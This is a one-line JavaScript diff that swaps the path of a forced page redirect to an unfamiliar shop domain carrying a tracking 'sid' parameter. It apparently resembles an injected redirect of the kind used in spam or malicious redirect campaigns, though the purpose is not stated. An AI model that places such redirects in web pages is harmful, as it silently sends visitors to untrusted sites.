@@ -1,1 +1,1 @@
-window.location.href = "https://faxolas.shop/QgIN/go?sid=8085";
+window.location.href = "https://faxolas.shop/uKcQ/go?sid=8085";
